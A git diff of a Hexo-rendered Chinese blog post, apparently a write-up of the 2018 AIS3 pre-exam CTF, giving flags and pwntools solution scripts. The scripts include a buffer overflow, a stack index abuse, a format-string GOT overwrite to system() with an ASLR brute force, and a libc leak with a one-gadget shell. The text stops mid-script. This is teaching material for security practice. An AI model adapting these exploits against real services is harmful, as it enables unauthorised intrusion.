@@ -203,7 +203,7 @@
   gtag('config', 'UA-109652024-2');
 </script>
 
-</head>
+<meta name="generator" content="Hexo 4.2.1"></head>
 
     
         <body class="post-body">
@@ -277,7 +277,7 @@ height:50vh;
                 
                 
                     <div class="post-intro-read">
-                        <span>Words: <span class="post-count word-count">3,340</span>Reading time: <span class="post-count reading-time">15 min</span></span>
+                        <span>Word count: <span class="post-count word-count">3.4k</span>Reading time: <span class="post-count reading-time">15 min</span></span>
                     </div>
                 
                 <div class="post-intro-meta">
@@ -401,65 +401,84 @@ height:50vh;
         <div class="container container-unloaded">
             <main class="main post-page">
     <article class="article-entry">
-        <p>時隔一年又是 AIS3，去年因為去日本沒拿到結業證書，還沒打到 final，虧<br>今年大家又跑來參加，反正暑假大概也是沒事做，看看這次 final 有沒有什麼好康的<br>這次 pre-exam 成績上升到了 2nd ，本來可以再多解一題，總之又是粗心的壞習慣增加了構造 payload 的時間<br>題目都還滿簡單的，有些題目滿有趣的<br><a id="more"></a><br>先附上人權，聊天室好像有人以為我是出題者，我只是覺得抱怨題目可以，但是你要給出邏輯Ｒ<br>大家都有解這題，都要花時間，就是有人解得快啊<br>不然就倒著解，50 - 2 還有 48 分直接衝上第一Ｒ<br>簡單的太難解，你有試過先解難的嗎</p>
-<img src="/tw/2018-AIS3-pre-exam/scoreboard.png" alt="scoreboard.png" title="">
+        <p>時隔一年又是 AIS3，去年因為去日本沒拿到結業證書，還沒打到 final，虧<br>今年大家又跑來參加，反正暑假大概也是沒事做，看看這次 final 有沒有什麼好康的<br>這次 pre-exam 成績上升到了 2nd ，本來可以再多解一題，總之又是粗心的壞習慣增加了構造 payload 的時間<br>題目都還滿簡單的，有些題目滿有趣的</p>
+<a id="more"></a>
+<p>先附上人權，聊天室好像有人以為我是出題者，我只是覺得抱怨題目可以，但是你要給出邏輯Ｒ<br>大家都有解這題，都要花時間，就是有人解得快啊<br>不然就倒著解，50 - 2 還有 48 分直接衝上第一Ｒ<br>簡單的太難解，你有試過先解難的嗎</p>
+<img src="/tw/2018-AIS3-pre-exam/scoreboard.png" class="">
+
 <h1 id="Rev-1-find"><a href="#Rev-1-find" class="headerlink" title="Rev-1:find"></a>Rev-1:find</h1><p>題目名字我有點忘了，應該是 find 拉，反正他就是一個什麼都沒有的 ELF 要你找 flag，就 strings 下去，就會發現一堆 <code>AIS3</code>，<code>ais3</code> 的字樣，小寫的都是一些對話，大寫的有一堆大括號，不過中間有偷夾個flag</p>
-<p><strong>AIS3{StrINg\$_And_gR3P_I5_U\$eFu1}</strong></p>
+<p><strong>AIS3{StrINg$_And_gR3P_I5_U$eFu1}</strong></p>
 <hr>
-<h1 id="Rev-2-secret"><a href="#Rev-2-secret" class="headerlink" title="Rev-2:secret"></a>Rev-2:secret</h1><p>總之這程式裡面有個區塊是寫好的密文，從<code>init</code>可以發現他原始加密的方式就是<code>srand(0)</code>之後，一直呼叫<code>rand()%2018</code>然後<code>xor</code>後，就是這段<code>secret</code>的值，所以他程式才會一直要你輸入，只要你的輸入能夠還原當初他亂數的過程，<code>xor</code>出來的就會是<code>flag</code>，他會把解密的<code>flag</code>放到<code>/tmp/secret</code>裡面，原本程式的邏輯是這樣：<br><img src="/tw/2018-AIS3-pre-exam/rev2_origin.png" alt="rev2_origin.png" title=""></p>
-<p>從組語那邊把他 patch 成這樣：<br><img src="/tw/2018-AIS3-pre-exam/rev2_patch.png" alt="rev2_patch.png" title=""></p>
+<h1 id="Rev-2-secret"><a href="#Rev-2-secret" class="headerlink" title="Rev-2:secret"></a>Rev-2:secret</h1><p>總之這程式裡面有個區塊是寫好的密文，從<code>init</code>可以發現他原始加密的方式就是<code>srand(0)</code>之後，一直呼叫<code>rand()%2018</code>然後<code>xor</code>後，就是這段<code>secret</code>的值，所以他程式才會一直要你輸入，只要你的輸入能夠還原當初他亂數的過程，<code>xor</code>出來的就會是<code>flag</code>，他會把解密的<code>flag</code>放到<code>/tmp/secret</code>裡面，原本程式的邏輯是這樣：</p>
+<img src="/tw/2018-AIS3-pre-exam/rev2_origin.png" class="">
+
+<p>從組語那邊把他 patch 成這樣：</p>
+<img src="/tw/2018-AIS3-pre-exam/rev2_patch.png" class="">
+
 <p>跑完就有 flag 了</p>
 <p><strong>AIS3{tHere_1s_a_VErY_VerY_VeRY_1OoO00O0oO0OOoO0Oo000OOoO00o00oG_f1@g_iN_my_m1Nd}</strong></p>
 <hr>
 <h1 id="Rev-3-crackme"><a href="#Rev-3-crackme" class="headerlink" title="Rev-3:crackme"></a>Rev-3:crackme</h1><p>就是一個 crackme 的樣子，VB .NET 寫的，用工具把 .NET 的 IR decompile 回類似 C# 的程式，就會找到關鍵的<code>xor</code>的部分，他裡面有一堆<code>yanny</code>，<code>laurel</code>之類的變數，寫個腳本讓每個變數 xor 171 就是 flag 了</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">cipher = <span class="string">"""// Token: 0x0400000A RID: 10\n\t\tprivate const int yanny = 234;\n\n\t\t// Token: 0x0400000B RID: 11\n\t\tprivate const int laurel = 226;\n\n\t\t// Token: 0x0400000C RID: 12\n\t\tprivate const int yammy = 248;\n\n\t\t// Token: 0x0400000D RID: 13\n\t\tprivate const int laurol = 152;\n\n\t\t// Token: 0x0400000E RID: 14\n\t\tprivate const int yommy = 208;\n\n\t\t// Token: 0x0400000F RID: 15\n\t\tprivate const int lourel = 154;\n\n\t\t// Token: 0x04000010 RID: 16\n\t\tprivate const int yonmy = 223;\n\n\t\t// Token: 0x04000011 RID: 17\n\t\tprivate const int lauril = 244;\n\n\t\t// Token: 0x04000012 RID: 18\n\t\tprivate const int yamny = 226;\n\n\t\t// Token: 0x04000013 RID: 19\n\t\tprivate const int laure1 = 158;\n\n\t\t// Token: 0x04000014 RID: 20\n\t\tprivate const int yanmy = 244;\n\n\t\t// Token: 0x04000015 RID: 21\n\t\tprivate const int lauro1 = 238;\n\n\t\t// Token: 0x04000016 RID: 22\n\t\tprivate const int yammi = 234;\n\n\t\t// Token: 0x04000017 RID: 23\n\t\tprivate const int loure1 = 216;\n\n\t\t// Token: 0x04000018 RID: 24\n\t\tprivate const int yemmy = 210;\n\n\t\t// Token: 0x04000019 RID: 25\n\t\tprivate const int leurel = 244;\n\n\t\t// Token: 0x0400001A RID: 26\n\t\tprivate const int yemny = 223;\n\n\t\t// Token: 0x0400001B RID: 27\n\t\tprivate const int leural = 228;\n\n\t\t// Token: 0x0400001C RID: 28\n\t\tprivate const int yenmy = 244;\n\n\t\t// Token: 0x0400001D RID: 29\n\t\tprivate const int leurol = 232;\n\n\t\t// Token: 0x0400001E RID: 30\n\t\tprivate const int yenny = 249;\n\n\t\t// Token: 0x0400001F RID: 31\n\t\tprivate const int leuro1 = 159;\n\n\t\t// Token: 0x04000020 RID: 32\n\t\tprivate const int yenmi = 200;\n\n\t\t// Token: 0x04000021 RID: 33\n\t\tprivate const int louro1 = 192;\n\n\t\t// Token: 0x04000022 RID: 34\n\t\tprivate const int yomny = 244;\n\n\t\t// Token: 0x04000023 RID: 35\n\t\tprivate const int leure1 = 230;\n\n\t\t// Token: 0x04000024 RID: 36\n\t\tprivate const int yonny = 206;\n\n\t\t// Token: 0x04000025 RID: 37\n\t\tprivate const int lauri1 = 138;\n\n\t\t// Token: 0x04000026 RID: 38\n\t\tprivate const int yamni = 214;"""</span>.split(<span class="string">' = '</span>)[<span class="number">1</span>:]</div><div class="line"></div><div class="line">flag =  <span class="string">''</span>.join(map(chr,[ int(x[:<span class="number">3</span>])^<span class="number">171</span> <span class="keyword">for</span> x <span class="keyword">in</span> cipher]))</div><div class="line"></div><div class="line"><span class="keyword">print</span> flag</div></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">cipher = <span class="string">"""// Token: 0x0400000A RID: 10\n\t\tprivate const int yanny = 234;\n\n\t\t// Token: 0x0400000B RID: 11\n\t\tprivate const int laurel = 226;\n\n\t\t// Token: 0x0400000C RID: 12\n\t\tprivate const int yammy = 248;\n\n\t\t// Token: 0x0400000D RID: 13\n\t\tprivate const int laurol = 152;\n\n\t\t// Token: 0x0400000E RID: 14\n\t\tprivate const int yommy = 208;\n\n\t\t// Token: 0x0400000F RID: 15\n\t\tprivate const int lourel = 154;\n\n\t\t// Token: 0x04000010 RID: 16\n\t\tprivate const int yonmy = 223;\n\n\t\t// Token: 0x04000011 RID: 17\n\t\tprivate const int lauril = 244;\n\n\t\t// Token: 0x04000012 RID: 18\n\t\tprivate const int yamny = 226;\n\n\t\t// Token: 0x04000013 RID: 19\n\t\tprivate const int laure1 = 158;\n\n\t\t// Token: 0x04000014 RID: 20\n\t\tprivate const int yanmy = 244;\n\n\t\t// Token: 0x04000015 RID: 21\n\t\tprivate const int lauro1 = 238;\n\n\t\t// Token: 0x04000016 RID: 22\n\t\tprivate const int yammi = 234;\n\n\t\t// Token: 0x04000017 RID: 23\n\t\tprivate const int loure1 = 216;\n\n\t\t// Token: 0x04000018 RID: 24\n\t\tprivate const int yemmy = 210;\n\n\t\t// Token: 0x04000019 RID: 25\n\t\tprivate const int leurel = 244;\n\n\t\t// Token: 0x0400001A RID: 26\n\t\tprivate const int yemny = 223;\n\n\t\t// Token: 0x0400001B RID: 27\n\t\tprivate const int leural = 228;\n\n\t\t// Token: 0x0400001C RID: 28\n\t\tprivate const int yenmy = 244;\n\n\t\t// Token: 0x0400001D RID: 29\n\t\tprivate const int leurol = 232;\n\n\t\t// Token: 0x0400001E RID: 30\n\t\tprivate const int yenny = 249;\n\n\t\t// Token: 0x0400001F RID: 31\n\t\tprivate const int leuro1 = 159;\n\n\t\t// Token: 0x04000020 RID: 32\n\t\tprivate const int yenmi = 200;\n\n\t\t// Token: 0x04000021 RID: 33\n\t\tprivate const int louro1 = 192;\n\n\t\t// Token: 0x04000022 RID: 34\n\t\tprivate const int yomny = 244;\n\n\t\t// Token: 0x04000023 RID: 35\n\t\tprivate const int leure1 = 230;\n\n\t\t// Token: 0x04000024 RID: 36\n\t\tprivate const int yonny = 206;\n\n\t\t// Token: 0x04000025 RID: 37\n\t\tprivate const int lauri1 = 138;\n\n\t\t// Token: 0x04000026 RID: 38\n\t\tprivate const int yamni = 214;"""</span>.split(<span class="string">' = '</span>)[<span class="number">1</span>:]</span><br><span class="line"></span><br><span class="line">flag =  <span class="string">''</span>.join(map(chr,[ int(x[:<span class="number">3</span>])^<span class="number">171</span> <span class="keyword">for</span> x <span class="keyword">in</span> cipher]))</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> flag</span><br></pre></td></tr></table></figure>
+
 <p><strong>AIS3{1t_I5_EAsy_tO_CR4ck_Me!}</strong></p>
 <hr>
-<h1 id="Rev-4-calc"><a href="#Rev-4-calc" class="headerlink" title="Rev-4:calc"></a>Rev-4:calc</h1><p>我還以為又是 windows 的計算機，原來是 Golang，他沒把 debug 訊息拿掉，看起來很快，程式要你輸入兩把 key ，然後把兩個陣列中的每個字元都對應相加，如果跟他程式內存的一個陣列相同的話 sever 就會把 flag 吐給你，輸入有限制，最長的 key 長度應該要是 0x19 ，這裡他題目有說 Unicode ，其實就是 Golang 中<code>rune</code>的特性，如果是用別的陣列，存取 Unicode 的時候會被拆解成多個 byte，但是<code>rune</code>會照著 Unicode 切，也就是<code>int32</code>的大小，而他程式中用來驗證的那個陣列也是<code>rune</code>，當中有包含 Unicode<br>這題也不用去把它拆成兩把 key，就把第二把 key 空著，把它程式裡面那個數值直接當第一把 key 送進去就會過了<br>然後因為 Golang 跟 gdb 之間有點小問題，所以用 gdb 在本地跑 payload 會跑不過<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"></div><div class="line">r = remote(<span class="string">"104.199.235.135"</span>,<span class="number">2115</span>)</div><div class="line"></div><div class="line">a = [<span class="string">u'\ufffd'</span>,<span class="string">u'\u006d'</span>,<span class="string">u'\ufffd'</span>,<span class="string">u'\u000f'</span>,<span class="string">u'\u006f'</span>,<span class="string">u'\u0058'</span>,<span class="string">u'\u0020'</span>,<span class="string">u'\u0031'</span>,<span class="string">u'\u0073'</span>,<span class="string">u'\u0020'</span>,<span class="string">u'\u0074'</span>,<span class="string">u'\u0048'</span>,<span class="string">u'\u0030'</span>,<span class="string">u'\u0000'</span>,<span class="string">u'\ufffd'</span>,<span class="string">u'\u0053'</span>,<span class="string">u'\u0074'</span>,<span class="string">u'\u0020'</span>,<span class="string">u'\u0063'</span>,<span class="string">u'\u0054'</span>,<span class="string">u'\u0046'</span>,<span class="string">u'\u0020'</span>,<span class="string">u'\u0074'</span>,<span class="string">u'\u003a'</span>,<span class="string">u'\u006d'</span>]</div><div class="line"></div><div class="line"><span class="keyword">print</span> r.recvuntil(<span class="string">"&gt;"</span>)</div><div class="line">r.sendline(<span class="string">"1"</span>)</div><div class="line"><span class="keyword">print</span> r.recvuntil(<span class="string">"&gt;"</span>)</div><div class="line">r.sendline(<span class="string">''</span>.join(a).encode(<span class="string">"utf8"</span>))</div><div class="line"><span class="keyword">print</span> r.recvuntil(<span class="string">"&gt;"</span>)</div><div class="line">r.sendline()</div><div class="line"><span class="keyword">print</span> r.recvuntil(<span class="string">"&gt;"</span>)</div><div class="line">r.sendline(<span class="string">"2"</span>)</div><div class="line">r.interactive()</div></pre></td></tr></table></figure></p>
-<p><strong>AIS3{G0_gO_g0_T0<em>h1Gh</em>!!!_R3v3rs3_oN_g0lauG_p1narY_1s_3xHanst3d_Orz}</strong></p>
+<h1 id="Rev-4-calc"><a href="#Rev-4-calc" class="headerlink" title="Rev-4:calc"></a>Rev-4:calc</h1><p>我還以為又是 windows 的計算機，原來是 Golang，他沒把 debug 訊息拿掉，看起來很快，程式要你輸入兩把 key ，然後把兩個陣列中的每個字元都對應相加，如果跟他程式內存的一個陣列相同的話 sever 就會把 flag 吐給你，輸入有限制，最長的 key 長度應該要是 0x19 ，這裡他題目有說 Unicode ，其實就是 Golang 中<code>rune</code>的特性，如果是用別的陣列，存取 Unicode 的時候會被拆解成多個 byte，但是<code>rune</code>會照著 Unicode 切，也就是<code>int32</code>的大小，而他程式中用來驗證的那個陣列也是<code>rune</code>，當中有包含 Unicode<br>這題也不用去把它拆成兩把 key，就把第二把 key 空著，把它程式裡面那個數值直接當第一把 key 送進去就會過了<br>然後因為 Golang 跟 gdb 之間有點小問題，所以用 gdb 在本地跑 payload 會跑不過</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">"104.199.235.135"</span>,<span class="number">2115</span>)</span><br><span class="line"></span><br><span class="line">a = [<span class="string">u'\ufffd'</span>,<span class="string">u'\u006d'</span>,<span class="string">u'\ufffd'</span>,<span class="string">u'\u000f'</span>,<span class="string">u'\u006f'</span>,<span class="string">u'\u0058'</span>,<span class="string">u'\u0020'</span>,<span class="string">u'\u0031'</span>,<span class="string">u'\u0073'</span>,<span class="string">u'\u0020'</span>,<span class="string">u'\u0074'</span>,<span class="string">u'\u0048'</span>,<span class="string">u'\u0030'</span>,<span class="string">u'\u0000'</span>,<span class="string">u'\ufffd'</span>,<span class="string">u'\u0053'</span>,<span class="string">u'\u0074'</span>,<span class="string">u'\u0020'</span>,<span class="string">u'\u0063'</span>,<span class="string">u'\u0054'</span>,<span class="string">u'\u0046'</span>,<span class="string">u'\u0020'</span>,<span class="string">u'\u0074'</span>,<span class="string">u'\u003a'</span>,<span class="string">u'\u006d'</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> r.recvuntil(<span class="string">"&gt;"</span>)</span><br><span class="line">r.sendline(<span class="string">"1"</span>)</span><br><span class="line"><span class="keyword">print</span> r.recvuntil(<span class="string">"&gt;"</span>)</span><br><span class="line">r.sendline(<span class="string">''</span>.join(a).encode(<span class="string">"utf8"</span>))</span><br><span class="line"><span class="keyword">print</span> r.recvuntil(<span class="string">"&gt;"</span>)</span><br><span class="line">r.sendline()</span><br><span class="line"><span class="keyword">print</span> r.recvuntil(<span class="string">"&gt;"</span>)</span><br><span class="line">r.sendline(<span class="string">"2"</span>)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+
+<p><strong>AIS3{G0_gO_g0_T0_h1Gh_!!!_R3v3rs3_oN_g0lauG_p1narY_1s_3xHanst3d_Orz}</strong></p>
 <hr>
-<h1 id="Pwn-1-mail"><a href="#Pwn-1-mail" class="headerlink" title="Pwn-1:mail"></a>Pwn-1:mail</h1><p>程式有個 <code>reply</code> function，只要跳進去就給 flag，程式的輸入是用<code>gets</code>，直接 buffer overflow 就好了<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env python2</span></div><div class="line"></div><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"></div><div class="line">r = remote(<span class="string">"104.199.235.135"</span>,<span class="number">2111</span>)</div><div class="line"></div><div class="line">reply = p64(<span class="number">0x400796</span>)</div><div class="line"></div><div class="line">r.recvuntil(<span class="string">"reciever: "</span>)</div><div class="line">r.sendline(<span class="string">"terrynini"</span>)</div><div class="line">r.recvuntil(<span class="string">"content: "</span>)</div><div class="line">r.sendline(cyclic(<span class="number">840</span>)+reply)</div><div class="line">r.interactive()</div></pre></td></tr></table></figure></p>
-<p><strong>AIS3{3hY_d0_yOU_Kn0uu_tH3_r3p1Y?!_I_d0nt_3ant_t0_giu3_QwQ}</strong></p>
+<h1 id="Pwn-1-mail"><a href="#Pwn-1-mail" class="headerlink" title="Pwn-1:mail"></a>Pwn-1:mail</h1><p>程式有個 <code>reply</code> function，只要跳進去就給 flag，程式的輸入是用<code>gets</code>，直接 buffer overflow 就好了</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">"104.199.235.135"</span>,<span class="number">2111</span>)</span><br><span class="line"></span><br><span class="line">reply = p64(<span class="number">0x400796</span>)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">"reciever: "</span>)</span><br><span class="line">r.sendline(<span class="string">"terrynini"</span>)</span><br><span class="line">r.recvuntil(<span class="string">"content: "</span>)</span><br><span class="line">r.sendline(cyclic(<span class="number">840</span>)+reply)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+<p><strong>AIS3{3hY_d0_yOU_Kn0uu_tH3_r3p1Y?!<em>I</em>d0nt_3ant_t0_giu3_QwQ}</strong></p>
 <hr>
 <h1 id="Pwn-2-darling"><a href="#Pwn-2-darling" class="headerlink" title="Pwn-2:darling"></a>Pwn-2:darling</h1><p>忘記補進度了，考完段考來看 darling，這題只限制了上界沒限制下界，所以能夠改寫 stack ，雖然不能改掉現在這個 stack frame 的 return address，但是可以修改後面的，把 printf 的 return address 改掉就好了</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env python2</span></div><div class="line"></div><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"></div><div class="line">r = remote(<span class="string">"104.199.235.135"</span>, <span class="number">2112</span>)</div><div class="line"></div><div class="line">r.recvuntil(<span class="string">"Index: "</span>)</div><div class="line">r.sendline(<span class="string">"-5"</span>)</div><div class="line">r.recvuntil(<span class="string">"Code: "</span>)</div><div class="line">r.sendline(<span class="string">"4196310"</span>)</div><div class="line">r.interactive()</div></pre></td></tr></table></figure>
-<p><strong>AIS3{r3w3mpeR_t0_CH3cK_b0tH_uPb3r<em>b0nud</em>&amp;_10w3r_bounp}</strong></p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">"104.199.235.135"</span>, <span class="number">2112</span>)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">"Index: "</span>)</span><br><span class="line">r.sendline(<span class="string">"-5"</span>)</span><br><span class="line">r.recvuntil(<span class="string">"Code: "</span>)</span><br><span class="line">r.sendline(<span class="string">"4196310"</span>)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+<p><strong>AIS3{r3w3mpeR_t0_CH3cK_b0tH_uPb3r_b0nud_&amp;_10w3r_bounp}</strong></p>
 <hr>
-<h1 id="Pwn-3-justfmt"><a href="#Pwn-3-justfmt" class="headerlink" title="Pwn-3:justfmt"></a>Pwn-3:justfmt</h1><p>這裡有 format string 的漏洞，我們可以把 got 表中的<code>vprintf</code>(<code>0x4f040</code>)修改成鄰近的<code>__libc_system</code>(<code>0x46590</code>)，不過從右邊數來第二個 byte 因為受到 ASLR 的影響要撞 $\frac{1}{16}$ 的機率<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env python2</span></div><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"></div><div class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</div><div class="line">    <span class="keyword">try</span>:</div><div class="line">        r = remote(<span class="string">"104.199.235.135"</span>,<span class="number">2113</span>)</div><div class="line"></div><div class="line">        <span class="keyword">print</span> r.recvuntil(<span class="string">":"</span>)</div><div class="line"></div><div class="line">        plt = <span class="number">0x601030</span></div><div class="line">        r.sendline(<span class="string">"sh\n\n%21900c%8$hn"</span>+p64(plt))</div><div class="line">        m = r.recvuntil(p64(plt))</div><div class="line">        r.sendline(<span class="string">"ls"</span>)</div><div class="line">        m = r.recv()</div><div class="line">        r.interactive()</div><div class="line">        <span class="keyword">print</span> m</div><div class="line">    <span class="keyword">except</span> EOFError:</div><div class="line">        r.close()</div><div class="line">        <span class="keyword">print</span> <span class="string">"try again"</span></div></pre></td></tr></table></figure></p>
+<h1 id="Pwn-3-justfmt"><a href="#Pwn-3-justfmt" class="headerlink" title="Pwn-3:justfmt"></a>Pwn-3:justfmt</h1><p>這裡有 format string 的漏洞，我們可以把 got 表中的<code>vprintf</code>(<code>0x4f040</code>)修改成鄰近的<code>__libc_system</code>(<code>0x46590</code>)，不過從右邊數來第二個 byte 因為受到 ASLR 的影響要撞 $\frac{1}{16}$ 的機率</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        r = remote(<span class="string">"104.199.235.135"</span>,<span class="number">2113</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">print</span> r.recvuntil(<span class="string">":"</span>)</span><br><span class="line"></span><br><span class="line">        plt = <span class="number">0x601030</span></span><br><span class="line">        r.sendline(<span class="string">"sh\n\n%21900c%8$hn"</span>+p64(plt))</span><br><span class="line">        m = r.recvuntil(p64(plt))</span><br><span class="line">        r.sendline(<span class="string">"ls"</span>)</span><br><span class="line">        m = r.recv()</span><br><span class="line">        r.interactive()</span><br><span class="line">        <span class="keyword">print</span> m</span><br><span class="line">    <span class="keyword">except</span> EOFError:</span><br><span class="line">        r.close()</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"try again"</span></span><br></pre></td></tr></table></figure>
 <p><strong>AIS3{fMt_stR1n6_1s_H4rp_s0w3t1meS_dnt_1ts_fnu!!}</strong></p>
 <hr>
-<h1 id="Pwn-4-MagicWorld"><a href="#Pwn-4-MagicWorld" class="headerlink" title="Pwn-4:MagicWorld"></a>Pwn-4:MagicWorld</h1><p>這題一樣有 format string 的問題，我們可以 leak 在 stack 上面<code>main</code>的 return address 來找到 <code>libc_start_main</code>，推算 libc base，然後找到 one gadget的位置<br>在<code>Try a spell</code>選項裡面有多讀一個 byte，我們可以用這個 byte 來做 stack pivot，然後控制 rip 流程，跳到 one gadget 裡面，就可以拿到 shell 了<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env python2</span></div><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"></div><div class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</div><div class="line">    <span class="keyword">try</span>:</div><div class="line">        r = remote(<span class="string">"104.199.235.135"</span>,<span class="number">2114</span>)</div><div class="line"></div><div class="line">        magic = <span class="number">0x46428</span></div><div class="line"></div><div class="line">        r.recvuntil(<span class="string">"Choice: "</span>)</div><div class="line">        r.sendline(<span class="string">"1"</span>)</div><div class="line">        r.recvuntil(<span class="string">"spell: "</span>)</div><div class="line">        r.sendline(<span class="string">"%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p"</span>)</div><div class="line">        r.recvuntil(<span class="string">"Regist: "</span>)</div><div class="line">        r.sendline(<span class="string">"2"</span>)</div><div class="line">        libc = r.recvuntil(<span class="string">"\n"</span>)[<span class="number">-16</span>:<span class="number">-1</span>].split(<span class="string">"x"</span>)</div><div class="line">        <span class="keyword">print</span> libc</div><div class="line">        libc = int(libc[len(libc)<span class="number">-1</span>],<span class="number">16</span>)</div><div class="line">        <span class="keyword">print</span> <span class="string">"libc_start_main: "</span> +hex(libc)</div><div class="line">        libc =  libc - <span class="number">0x21f45</span></div><div class="line">        magic = libc+magic</div><div class="line">        <span class="keyword">print</span> <span class="string">"libc_base: "</span> +hex(libc)</div><div class="line">        <span class="keyword">print</span> <span class="string">"magic: "</span> + hex(magic)</div><div class="line"></div><div class="line">        spell_rbp = p64(magic).ljust(<span class="number">16</span>,<span class="string">"\0"</span>) + <span class="string">"h"</span></div><div class="line">        <span class="keyword">print</span> spell_rbp</div><div class="line">        r.recvuntil(<span class="string">"Give me your spell: "</span>)</div><div class="line">        r.send(spell_rbp)</div><div class="line">        r.sendline(<span class="string">"cat flag"</span>)</div><div class="line">        r.interactive()</div><div class="line">    <span class="keyword">except</span>:</div><div class="line">        r.close()</div><div class="line">        <span class="keyword">print</span> <span class="string">"try again"</span></div></pre></td></tr></table></figure></p>
+<h1 id="Pwn-4-MagicWorld"><a href="#Pwn-4-MagicWorld" class="headerlink" title="Pwn-4:MagicWorld"></a>Pwn-4:MagicWorld</h1><p>這題一樣有 format string 的問題，我們可以 leak 在 stack 上面<code>main</code>的 return address 來找到 <code>libc_start_main</code>，推算 libc base，然後找到 one gadget的位置<br>在<code>Try a spell</code>選項裡面有多讀一個 byte，我們可以用這個 byte 來做 stack pivot，然後控制 rip 流程，跳到 one gadget 裡面，就可以拿到 shell 了</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        r = remote(<span class="string">"104.199.235.135"</span>,<span class="number">2114</span>)</span><br><span class="line"></span><br><span class="line">        magic = <span class="number">0x46428</span></span><br><span class="line"></span><br><span class="line">        r.recvuntil(<span class="string">"Choice: "</span>)</span><br><span class="line">        r.sendline(<span class="string">"1"</span>)</span><br><span class="line">        r.recvuntil(<span class="string">"spell: "</span>)</span><br><span class="line">        r.sendline(<span class="string">"%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p"</span>)</span><br><span class="line">        r.recvuntil(<span class="string">"Regist: "</span>)</span><br><span class="line">        r.sendline(<span class="string">"2"</span>)</span><br><span class="line">        libc = r.recvuntil(<span class="string">"\n"</span>)[<span class="number">-16</span>:<span 